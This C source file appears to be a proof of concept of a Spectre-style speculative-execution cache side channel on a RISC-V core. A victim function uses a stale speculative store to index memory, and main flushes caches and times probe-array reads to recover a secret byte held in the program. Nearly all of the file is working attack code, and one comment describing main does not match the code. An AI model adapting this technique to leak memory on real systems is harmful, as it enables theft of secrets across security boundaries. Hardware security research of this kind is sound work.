#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS 1 
#define ATTACK_SAME_ROUNDS 1 
#define SECRET_SZ 1
#define CACHE_HIT_THRESHOLD 50

volatile uint64_t array1_sz = 16;
volatile uint8_t unused1[64];
volatile uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
volatile uint8_t unused2[64];
volatile uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
volatile char* secretString = "h";
size_t str[256];
double a=10.0;
double b=5;
double c=3;
double d=999;

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}
#pragma GCC push_options
#pragma GCC optimize("O1")
void victim_function1(size_t malicious_x)
{
        volatile uint8_t temp = 2;
	for(int i=0;i<100;i++)
	{
	     int junk=secretString[0];
	}
	str[3]=malicious_x;
	str[(int)((d*c+b*a)/(a*b*c+a)-16)]=0; //Speculative store instruction, using stale data from str[3]
	temp &= array2[array1[str[3]] * L1_BLOCK_SZ_BYTES];  //cache side channel
}
#pragma GCC pop_options

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */

int main(void){
    volatile uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    volatile uint64_t start, diff, passInIdx, randIdx;
    volatile uint8_t dummy = 0;
    volatile static uint64_t results[256];

    // try to read out the secret
    for(volatile uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(volatile uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times    
        for(volatile uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
            flushCache((uint64_t)a, sizeof(a));
            flushCache((uint64_t)b, sizeof(b));
            flushCache((uint64_t)c, sizeof(c));
            flushCache((uint64_t)d, sizeof(d));
            
            victim_function1(attackIdx);

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (volatile int64_t i = 0; i < 256; ++i){
                start = rdcycle();
                dummy += array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                printf("%d ",diff);
		if ( diff < CACHE_HIT_THRESHOLD ){
                    results[i] += 1;
                }
            }
            printf("\n");
           
        }

        // get highest and second highest result hit values
        volatile uint8_t output[2];
        volatile uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }
    
 

    return 0;
}
